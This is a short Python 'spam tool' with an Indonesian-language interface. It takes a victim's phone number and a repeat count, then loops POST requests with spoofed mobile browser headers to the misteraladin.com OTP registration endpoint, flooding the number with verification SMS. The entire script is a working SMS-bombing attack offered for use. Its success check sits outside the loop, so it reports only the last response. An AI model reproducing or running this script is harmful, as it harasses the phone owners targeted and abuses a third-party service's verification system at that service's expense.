import requests,time,json,os,random,sys
os.system('clear')
time.sleep(1)
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.5)
mengetik("\033[1;31m\nbobokdalu spam tool V.1\033[1;31m\n ")
time.sleep(1)
print("\033[1;31m\033[1;32m* \033[1;31mBy  \033[1;93m: \033[1;37mbobokdalu \033[1;31m\n")
print("\033[1;31m\033[1;32m* \033[1;31mYT  \033[1;93m: \033[1;37m\033[4m**********\033[0m \033[1;31m    \n")
print("\033[1;31m\033[1;32m* \033[1;31m°°°°   \033[1;93m: \033[1;37m\033[4m______ALADIN_____\033[0m\033[1;31m\n")
time.sleep(1)

no = input('ex : 08xx\n[In] Phone:0')
jml = int(input('[In] Jumlah: '))

head={"Host":"m.misteraladin.com",
"content-length":"81",
"accept-language":"id",
"sec-ch-ua-mobile":"?1",
"content-type":"application/json",
"accept":"application/json, text/plain, */*",
"user-agent":"Mozilla/5.0 (Linux; Android 10; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
"x-platform":"mobile-web",
"sec-ch-ua-platform":"Android",
"origin":"https://m.misteraladin.com",
"sec-fetch-site":"same-origin",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://m.misteraladin.com/account",
"accept-encoding":"gzip, deflate, br",}
son=json.dumps({"phone_number_country_code":"62","phone_number":no,"type":"register"})


print("\n[RESULT]")
for i in range(jml):
      pos = requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers=head,data=son).text
if  "error" in  pos:
        print ("Gagal kirim")
else:
        print ("Sukses")
        
